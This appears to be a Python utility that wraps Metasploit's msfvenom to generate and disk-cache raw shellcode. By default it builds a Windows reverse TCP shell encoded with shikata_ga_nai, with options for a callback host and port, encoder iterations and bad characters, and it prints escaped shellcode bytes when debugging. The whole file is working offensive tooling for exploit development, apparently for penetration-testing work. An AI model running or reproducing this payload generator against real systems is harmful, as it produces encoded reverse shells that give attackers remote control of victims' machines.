import subprocess
import tempfile
import os
from typing import Literal, Optional
from colorama import Fore, Back, Style
import hashlib
import pickle
from pathlib import Path

MSFVENOM_PATH = "/usr/bin/msfvenom"

# Persistent cache directory (you can change this path if needed)
CACHE_DIR = Path(os.path.expanduser("./msfvenom_cache"))
CACHE_DIR.mkdir(parents=True, exist_ok=True)


def _generate_cache_key(
    payload: str,
    LHOST: Optional[str],
    LPORT: Optional[int],
    encoder: str,
    iterations: int,
    bad_chars: str,
    arch: str,
    platform: str,
) -> str:
    """Generate a deterministic cache key (MD5 hash) from parameters."""
    key_str = (
        f"{payload}|{LHOST or ''}|{LPORT or ''}|"
        f"{encoder}|{iterations}|{bad_chars}|"
        f"{arch}|{platform}"
    )
    return hashlib.md5(key_str.encode("utf-8")).hexdigest()


def _cache_path(key: str) -> Path:
    """Return the full path to the cached file."""
    return CACHE_DIR / key


def generatePayload(
    payload: str = "windows/shell_reverse_tcp",
    LHOST: Optional[str] = None,
    LPORT: Optional[int] = None,
    encoder: str = "x86/shikata_ga_nai",
    iterations: int = 1,
    bad_chars: str = "",
    arch: Literal["x86", "x64"] = "x86",
    platform: str = "windows",
    debug: bool = False,
) -> bytes:
    """Python wrapper for msfvenom with persistent disk caching."""
    key = _generate_cache_key(
        payload, LHOST, LPORT, encoder, iterations, bad_chars, arch, platform
    )
    cache_file = _cache_path(key)

    # === Cache HIT ===
    if cache_file.exists():
        try:
            with open(cache_file, "rb") as f:
                shellcode = f.read()
            if debug:
                print(
                    f"\t{Fore.GREEN}[+] Cache HIT (disk): Loaded {len(shellcode)} bytes from {cache_file}{Style.RESET_ALL}"
                )
                escaped = "".join(f"\\x{b:02x}" for b in shellcode)
                print(
                    f"\t\t{Fore.CYAN}[=] Cached shellcode:\n\t\t {Fore.YELLOW}{escaped}{Style.RESET_ALL}"
                )
            if b"\x00" in shellcode:
                print(
                    f"{Back.WHITE}{Fore.RED}[!] Warning: Interior null byte(s) detected in shellcode!{Style.RESET_ALL}"
                )
            return shellcode
        except Exception as e:
            if debug:
                print(
                    f"\t{Fore.YELLOW}[!] Failed to read cache file {cache_file}, regenerating... ({e}){Style.RESET_ALL}"
                )

    # === Cache MISS → Generate fresh ===
    if debug:
        print(
            f"\t{Fore.RED}[-] Cache MISS: Generating new shellcode...{Style.RESET_ALL}"
        )

    cmd = [MSFVENOM_PATH, "-p", payload, "-f", "raw"]
    cmd += ["-a", arch, "--platform", platform]
    if encoder:
        cmd += ["-e", encoder, "-i", str(iterations)]
    if bad_chars:
        cmd += ["-b", bad_chars]
    if LHOST:
        cmd.append(f"LHOST={LHOST}")
    if LPORT:
        cmd.append(f"LPORT={LPORT}")

    if debug:
        print(
            f"\t{Fore.RED}o Running msfvenom command:\n\t\t{Fore.YELLOW}{' '.join(cmd)}{Style.RESET_ALL}"
        )

    with tempfile.TemporaryDirectory() as tmpdir:
        bin_path = os.path.join(tmpdir, "shell.bin")
        try:
            with open(bin_path, "wb") as f:
                result = subprocess.run(
                    cmd,
                    stdout=f,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.DEVNULL,
                    env=os.environ.copy(),
                    timeout=60,
                )
            if result.returncode != 0:
                error_msg = result.stderr.decode("utf-8", errors="replace").strip()
                raise RuntimeError(
                    f"{Back.WHITE}{Fore.RED}msfvenom failed (code {result.returncode}):\n{error_msg}{Style.RESET_ALL}"
                )
        except FileNotFoundError:
            raise RuntimeError(
                f"{Back.WHITE}{Fore.RED}msfvenom not found at {MSFVENOM_PATH}{Style.RESET_ALL}"
            )
        except PermissionError as e:
            raise RuntimeError(
                f"{Back.WHITE}{Fore.RED}Cannot execute or write files: {e}{Style.RESET_ALL}"
            )
        except subprocess.TimeoutExpired:
            raise RuntimeError(
                f"{Back.WHITE}{Fore.RED}msfvenom timed out{Style.RESET_ALL}"
            )

        with open(bin_path, "rb") as f:
            shellcode = f.read()

    original_len = len(shellcode)
    shellcode = shellcode.rstrip(b"\x00")
    if len(shellcode) != original_len and debug:
        print(
            f"\t{Fore.YELLOW}[i] Stripped {original_len - len(shellcode)} trailing null byte(s){Style.RESET_ALL}"
        )

    if debug:
        escaped = "".join(f"\\x{b:02x}" for b in shellcode)
        print(
            f"\t\t{Fore.CYAN}[=] Generated {len(shellcode)} bytes:\n\t\t {Fore.YELLOW}{escaped}{Style.RESET_ALL}"
        )

    if b"\x00" in shellcode:
        print(
            f"{Back.WHITE}{Fore.RED}[!] Warning: Interior null byte(s) detected in shellcode!{Style.RESET_ALL}"
        )

    # === Save to disk cache ===
    try:
        with open(cache_file, "wb") as f:
            f.write(shellcode)
        if debug:
            print(f"\t{Fore.GREEN}[+] Saved to cache: {cache_file}{Style.RESET_ALL}")
    except Exception as e:
        if debug:
            print(
                f"\t{Fore.YELLOW}[!] Failed to write cache file {cache_file}: {e}{Style.RESET_ALL}"
            )

    return shellcode
